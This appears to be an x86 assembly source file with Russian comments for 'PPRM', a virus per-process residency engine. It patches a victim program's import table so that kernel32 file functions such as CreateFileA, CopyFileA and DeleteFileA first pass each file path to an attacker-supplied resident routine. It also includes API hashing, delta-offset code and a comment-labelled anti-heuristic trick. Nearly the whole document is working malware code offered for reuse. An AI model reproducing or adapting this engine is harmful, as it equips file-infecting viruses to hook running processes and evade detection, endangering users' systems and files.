;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                                                                                                   
;                                                                                                      	 ;
;                                                                                                    	 ;
;            xxxxxxxxxxx    xxxxxxxxxxx    xxxxxxxxxxx    xxxx       xxxx 								 ;
;            xxxxxxxxxxxx   xxxxxxxxxxxx   xxxxxxxxxxxx   xxxxx     xxxxx								 ;
;            xxxx    xxxx   xxxx    xxxx   xxxx    xxxx   xxxxxx   xxxxxx								 ;
;            xxxx    xxxx   xxxx    xxxx   xxxx    xxxx   xxxxxxx xxxxxxx								 ;
;            xxxx    xxxx   xxxx    xxxx   xxxx    xxxx   xxxx xxxxx xxxx								 ;
;            xxxxxxxxxxx    xxxxxxxxxxx    xxxxxxxxxxx    xxxx  xxx  xxxx								 ;
;            xxxxxxxxxx     xxxxxxxxxx     xxxxxxxxxxxx   xxxx       xxxx								 ;
;            xxxx           xxxx           xxxx    xxxx   xxxx       xxxx								 ;
;            xxxx           xxxx           xxxx    xxxx   xxxx       xxxx								 ;
;            xxxx           xxxx           xxxx    xxxx   xxxx       xxxx								 ; 
;																										 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ; 
;								Per-Process Residency Motor												 ; 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										     :)!														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									    функция PPRM													 ; 
;							  МОТОР ПЕРПРОЦЕССНОЙ РЕЗИДЕНТНОСТИ											 ;  
;																										 ;
;																										 ;
;ВХОД:																									 ;
;1 параметр - адрес резидентной функции, которая будет выполнена перед вызовом перехваченных апишек;	 ;
;2 параметр - ImageBase жертвы 																			 ;
;--------------------------------------------------------------------------------------------------------;
;ВЫХОД:																									 ;
;EAX - число перехваченных апишек (понятно, что 0 означает нихера, а что больше его есть гуд) 			 ;   		 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									  ЗАМЕТКИ															 ;
;																										 ;
;1 параметр:																							 ;
;				функция, чей адрес должен быть 1-ым параметром, должна иметь вид:						 ;
;																										 ;
;					DWORD xMyResidentFunc(LPVOID lParam);	//имя, конечно, может быть любым			 ;
;					где в lParam будет передано некое значение (со стандартным набором перехватываемых 	 ;
;					апишек это будет адрес строки (путь к файлу/папке). На этом все. 					 ;
;--------------------------------------------------------------------------------------------------------;
;Функции GetDelta, xstrlen, small_symbol, xCRC32A находятся в модуле xBase.asm. Можно этот модуль либо   ; 
;также подключать, либо тогда вынести нужные функции в этот модуль. Либо в конце данного сорца			 ; 
;расскоментить нужные функи. 																			 ;  
;--------------------------------------------------------------------------------------------------------;
;Хэши получились функцией xCRC32A(char *pszFuncName). Можно заменить алгоритм данной функции, в таком    ;
;случае посчитать снова хэши от имен перехватываемых функций, и заменить этими хэшами старые хэши, что   ; 
;используются в данном движке. 																			 ; 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;         
;																										 ;
;										y0p!															 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									  	ФИЧИ															 ;
;																										 ;
;(+) базонезависимость																					 ;
;(+) delta-offset 																				 		 ;
;(+) прост в использовании																				 ;
;(+) не использует WinApi'шек 																			 ;
;(+) патчинг таблички импорта 																			 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									ИСПОЛЬЗОВАНИЕ: 														 ;
;																										 ;
;1) Подключение:																						 ;
;		xbase.asm, pprm.asm					;либо подключать только pprm.asm, но тогда функу xCRC32A и   ;
;											;другие необходимые раскоментировать						 ; 								  
;2) Вызов (пример stdcall):																				 ;
;		push	00400000h					;ImageBase жертвы 											 ;
;		push	offset xMyResidentFunc		;адрес нашей функи 											 ;
;		call	PPRM						;вызываем данный мотор 										 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;



												;m1x
											;pr0mix@mail.ru
										;EOF 
 


MAX_LEN_DLLNAME		equ		72					;максимальная длина имени длл 
xfunc_pprm			equ		dword ptr [ebp+24h]	;адрес нашей резидентной функи  
base_pprm			equ		dword ptr [ebp+28h]	;ImageBase (резалт MapViewOfFile) 

delta_pprm			equ		dword ptr [ebp-04]	;дельта-смещение 
dllname_addr		equ		dword ptr [ebp-04-MAX_LEN_DLLNAME-04]	;буфер для хранения строк (именн длл) 

hash_kernel32		equ		06AE69F02h			;хэш от строки "kernel32.dll"  
end_ht_pprm			equ		0FFFFh				;признак конца табличек (смотри ниже)     

                                       


PPRM:
	pushad										;сохраняем регистры  
	mov		ebp,esp								;[ebp+00]         
	call	GetDelta							;получаем дельта-смещение 
	push	eax 								;[ebp-04]
	lea		ecx,dword ptr [xResidentFunc+eax]	;сюда сохраним функцию, которая будет вызываться перед оригинальными апишками (резидентная наша функа)  
	lea		edi,dword ptr [hook_table_01+eax]	;получаем адрес хэшей имен нужных апишек  
	lea		esi,dword ptr [hook_api_addr+eax]	;получаем адрес буфера, где будем хранить адреса похученных апишек       
	push	xfunc_pprm
	pop		dword ptr [ecx]						;и сохраним адрес нашей резидентной функи   
	sub		esp,MAX_LEN_DLLNAME					;[ebp-04-MAX_LEN_DLLNAME] выделим в стэке место для хранения строки (имени очередной длл) 
	push	esp									;[ebp-04-MAX_LEN_DLLNAME-04]   
	push	00h									;в стэке будет вестить счетчик, сколько апишек получилось похукать  
	mov		ebx,base_pprm						;EBX = IMAGEBASE
	assume	ebx:ptr IMAGE_DOS_HEADER
	add		ebx,[ebx].e_lfanew
	assume	ebx:ptr IMAGE_NT_HEADERS
	mov		edx,[ebx].OptionalHeader.DataDirectory[1*8].VirtualAddress 
	test	edx,edx								;имеется ли в данном файле табличка импорта (ТИ) ?    
	je		_pprmret_							;если нет, то на выход 
	add		edx,base_pprm						;иначе, получим ее VA
	assume	edx:ptr IMAGE_IMPORT_DESCRIPTOR
	cmp		[edx].OriginalFirstThunk,0			;также проверим, имеются ли имена функций? (а то, блядь, какой-нить борланд любит тереть их нах) 
	je		_pprmret_							;если ноль, выходим 
	 
_cyclehookapi_: 
	call	xSearchApi							;иначе вызываем вспомогательную функцию поиска нужной апишки 
	test	eax,eax								;если ничего не нашли, ищем другие адреса апи по хэшам   
	je		_notfoundapi_  
	mov		ecx,dword ptr [ebx]					;иначе, в ECX теперь находится адрес очередной нужной апи-функи 
	mov		eax,dword ptr [esi]
	add		eax,delta_pprm						;в EAX - адрес, где сохранить адрес api  
	mov		dword ptr [eax],ecx					;& сохраняем  
	mov		ecx,dword ptr [edi+04]  
	add		ecx,delta_pprm						;в ECX адрес функи, которая будет вызвана резидентно (перед похученной апишкой) 
	mov		dword ptr [ebx],ecx					;и вместо адреса апи, в ТИ записываем адрес этой резидентной функи
	inc		dword ptr [esp]						;увеличиваем счетчик на +1  
_notfoundapi_: 
	add		edi,8								;двигаемся дальше  
	lodsd
	cmp		word ptr [edi],end_ht_pprm			;все ли элементы прошли? 
	je		_pprmret_ 
	jmp		_cyclehookapi_      

_pprmret_:
	pop		eax									;достаем счетчик из стэка 	 
	mov		dword ptr [ebp+1Ch],eax				;EAX=EAX    
	mov		esp,ebp  
	popad	
	ret		4*2									;на выход 
;========================================================================================================
 
;========================================================================================================
;вспомогательная функа xSearchApi 
;========================================================================================================
xSearchApi:
	push	edx 
	push	esi
		 
_nextIID_:
	push	edi
	mov		edi,dllname_addr					;в EDI - адрес в стэке (ранее выделенное место для хранения строки)    
	mov		esi,base_pprm;ebx 
	add		esi,[edx].Name1						;в ESI - VA имени длл 
	push	esi
	call	xstrlen								;узнаем длину имени
	xchg	eax,ecx
	push	edi
	rep		movsb								;и копируем в свой буфер 
	and		byte ptr [edi],0					;завершающий ноль    
	pop		edi   

	push	edi
	call	small_symbol						;приводим символы к одному регистру 

	push	edi
	call	xCRC32A								;получаем хэш от имени длл 
	 
	pop		edi 

 	cmp		eax,hash_kernel32					;сравниваем полученный хэш с хэшем от "kernel32.dll"  
 	jne		_nothookk32_						;если хеши разные, то продолжаем искать кернел32 
 	mov		ebx,[edx].FirstThunk
 	add		ebx,base_pprm						;иначе EBX указывает IAT    
 	mov		esi,[edx].OriginalFirstThunk		;ESI указывает на массив, где должны быть имена винапи-функций
 	add		esi,base_pprm
 	assume	esi:ptr IMAGE_THUNK_DATA32 
_hnextapi_: 
 	mov		ecx,[esi].u1.AddressOfData 
 	add		ecx,base_pprm
 	assume	ecx:ptr IMAGE_IMPORT_BY_NAME 
 	inc		ecx
 	inc		ecx									;в ECX - имя очередной функции
 	push	ecx
 	call	xCRC32A								;получаем хэш от этого имени
 	cmp		eax,dword ptr [edi]					;если он совпадает с одним из хэшей в нашей табличке, то 
 	je		_eqhashapi_							;необходимая функа найдена, перепрыгиваем дальше   
	add		ebx,sizeof IMAGE_THUNK_DATA32		;иначе продолжаем поиск   
	lodsd
	cmp		dword ptr [esi],0					;все ли апишки в данной длл мы прошли? 
	jne		_hnextapi_   	   	                                 
_nothookk32_:
 	add		edx,sizeof IMAGE_IMPORT_DESCRIPTOR
 	cmp		[edx].FirstThunk,0					;все ли длл в ТИ мы прошли? 
 	jne		_nextIID_           
 	xor		eax,eax
_eqhashapi_:   
_noteqhashapi_:
	pop		esi
	pop		edx  
 	ret											;возвращемся в основную подпрограмму     



;========================================================================================================
;РЕЗИДEНТНЫЕ ФУНКИ, КОТОРЫЕ БУДУТ ВЫЗВАНЫ ПЕРЕД ПОХУЧЕННЫМИ АПИШКАМИ 
;======================================================================================================== 
xHookFindFirstFileA: 
	call	xHookHandler						;вызывается общий для всех перехваченных апишек обработчик, который вызвет нашу резидентную функу :)! 
			db 0B8h								;mov	eax,<addr_apifunc> 
	xFunc1	dd 00h
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookCreateFileA:
	call	xHookHandler
			db 0B8h
	xFunc2	dd 00h
	jmp		eax   
;--------------------------------------------------------------------------------------------------------   
xHookCopyFileA:
	call	xHookHandler
			db 0B8h
	xFunc3	dd 00h 
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookMoveFileA:
	call	xHookHandler
			db 0B8h
	xFunc4	dd 00h  
	jmp		eax
;--------------------------------------------------------------------------------------------------------
xHookMoveFileExA:
	call	xHookHandler
			db 0B8h
	xFunc5	dd 00h  
	jmp		eax   
;-------------------------------------------------------------------------------------------------------- 
xHookDeleteFileA: 
	call	xHookHandler
			db 0B8h
	xFunc6	dd 00h   
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookGetFileAttributesA: 
	call	xHookHandler
			db 0B8h
	xFunc7	dd 00h   
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookSetFileAttributesA:  
	call	xHookHandler
			db 0B8h
	xFunc8	dd 00h   
	jmp		eax   
;========================================================================================================   


;========================================================================================================
;вызывается общий (1) обработчик для всех перехваченных апишек 
;========================================================================================================
xHookHandler:
	pushad										;сохраняем регистры 
	pushfd										;а также флаги   
					db	0B8h					;mov	eax,<addr_myresidentfunc>  
	xResidentFunc	dd	00h 
	push	dword ptr [esp+2Ch]					;помещаем в стэк первый параметр перехваченной апишки (это строка (путь к файлу/папке))   
	call	eax									;вызываем нашу резидентную функцию   
    popfd
    popad   
	ret
;========================================================================================================  



;========================================================================================================
;табличка хэшей (от имен тех апишек, которые мы хотим перехватить) и обработчиков (winapi funcs)  
;======================================================================================================== 
hook_table_01:  
	dd		0C9EBD5CEh							;FindFirstFileA 
	dd		(offset xHookFindFirstFileA)

	dd		0553B5C78h 							;CreateFileA 
	dd		(offset xHookCreateFileA) 	

	dd		00199DC99h 
	dd		(offset xHookCopyFileA)				;CopyFileA 

	dd		0DE9FF0D1h  
	dd		(offset xHookMoveFileA)

   	dd		08573E006h  
	dd		(offset xHookMoveFileExA) 

	dd		0919B6BCBh    
	dd		(offset xHookDeleteFileA) 

	dd		030601C1Ch  
	dd		(offset xHookGetFileAttributesA) 

	dd		0156B9702h  	   
	dd		(offset xHookSetFileAttributesA)  

	dw		end_ht_pprm
;======================================================================================================== 	 


;========================================================================================================
;в этой табличке сохранятся адреса перехваченных апишек  
;======================================================================================================== 
hook_api_addr: 
	dd 		(offset xFunc1)
	dd 		(offset xFunc2)
	dd		(offset xFunc3) 
	dd		(offset xFunc4)
	dd		(offset xFunc5)
	dd		(offset xFunc6)
	dd		(offset xFunc7)
	dd		(offset xFunc8)  
	;dw		end_ht_pprm
;======================================================================================================== 	 

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи PPRM 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 



              

comment !   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;function GetDelta
;получение дельта-смещения 
;ВЫХОД:
;ЕАХ - дельта-смещение 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
GetDelta:
	call	_delta_
	mov		esp,ebp								;антиэвристика 
	pop		ebp
	ret
_delta_:
	pop		eax
	sub		eax,(_delta_ - 4)
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции GetDelta 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция xstrlen
;поиск длины строки
;ВХОД ( xstrlen(char *pszStr) ):
;pszStr - указатель на строку, чью длину надо посчитать 
;ВЫХОД:
;EAX    - длина строки (в байтах) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xstrlen:
	push	edi		 
	mov		edi,dword ptr [esp+08]
	push	edi  
	xor		eax,eax
_numsymbol_: 
	scasb
	jne		_numsymbol_
	xchg	eax,edi
	dec		eax
	pop		edi
	sub		eax,edi
	pop		edi  
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xstrlen 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция small_symbol
;приведение бук0в строки к одному виду
;ВХОД ( small_symbol(char *pszStr) ):
;pszStr - указатель на строку (ака адрес строки)
;ВЫХОД:
;(+) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
small_symbol: 
	mov		eax,dword ptr [esp+04]   
_nxtsymbol_:	  
	cmp		byte ptr [eax],65
	jb		_skip01_ 
	cmp		byte ptr [eax],90
	ja		_skip01_  
	add		byte ptr [eax],32  
_skip01_: 
	cmp		byte ptr [eax],0
	je		_ssret_
	inc		eax 
	jmp		_nxtsymbol_  

_ssret_:
	mov		eax,dword ptr [esp+04] 
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи small_symbol 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32A
;вычисление CRC строки
;ВХОД (stdcall) (xCRC32A(char *pszStr)):
;	pszStr - строка, чей хэш надо посчитать 
;ВЫХОД:
;	(+) EAX - хэш от строки 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32A:
	push	ecx
	mov		ecx,dword ptr [esp+08]   
	push	ecx
	call	xstrlen
	test	eax,eax
	je		_xcrc32aret_
	push	eax
	push	ecx 
	call	xCRC32
_xcrc32aret_: 
	pop		ecx 
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xCRC32A 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 			




	 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32
;подсчет CRC32 
;ВХОД (stdcall) (xCRC32(BYTE *pBuffer,DWORD dwSize)):
;	pBuffer - буфер, в котором код, чей crc32 надо посчитать
;	dwSize  - сколько байт посчитать ? (+) 
;ВЫХОД:
;	(+) EAX - CRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32:
	pushad
	mov		ebp,esp
	xor		eax,eax
	mov		edx,dword ptr [ebp+24h]
	mov		ecx,dword ptr [ebp+28h]
	jecxz	@4 
	dec		eax 
@1:
	xor		al,byte ptr [edx]
	inc		edx
	push	08
	pop		ebx
@2:
	shr		eax,1
	jnc		@3
	xor		eax,0EDB88320h
@3:
	dec		ebx 
	jnz		@2
	loop	@1
	not		eax
@4:
	mov		dword ptr [ebp+1Ch],eax 
	popad
	ret		4*2 							
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx		
;конец функции xCRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	
		;! 
           
;XD 
 